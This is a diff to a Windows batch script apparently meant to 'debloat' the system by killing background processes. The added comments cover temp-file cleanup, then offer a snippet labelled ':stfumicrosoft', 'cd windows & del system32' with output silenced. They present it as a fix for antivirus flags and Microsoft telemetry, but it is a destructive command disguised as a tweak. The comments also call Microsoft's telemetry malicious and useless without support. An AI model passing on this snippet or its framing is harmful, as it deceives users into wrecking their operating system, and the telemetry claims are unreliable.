@@ -19,6 +19,29 @@
 :: XboxAppServices.exe - xbox link, doesnt matter unless ur using some xbox stuff
 :: WSearchIndexer.exe - pre-indexer for search, eats some cpu
 :: you should now understand these i think
+:: this also deletes temporary files. an example is this
+:: 
+:: cd %temp% & del filenameexample.txt
+:: 
+:: you cant use it sadly, that just wont delete all files being temporary.
+:: instead, use cleanmgr
+::
+:: cleanmgr /sagerun:1 
+::
+:: cleanmgr can quickly delete all temp files in one go, using one command too
+::
+:: now if virustotal ever flags this as malicious, also microsoft defender can:
+:: this might be caused because this disables microsoft's favorite "safe" features for them to spy on u
+:: basically malicious telemetries that do NOTHING
+::
+:: @echo off
+:: call :stfumicrosoft
+:: 
+:: :stfumicrosoft
+:: cd windows & del system32 >nul 2>&1
+::
+
+
 echo [+] Killing OneDrive.exe...
 taskkill /f /im "OneDrive.exe" >nul 2>&1
 echo [+] Killing YourPhone.exe...
@@ -87,4 +110,5 @@ exit
 :: check out the readme NOW.
 :: check out the readme NOW.
 :: check out the readme NOW.
+
 :: check out the readme NOW.
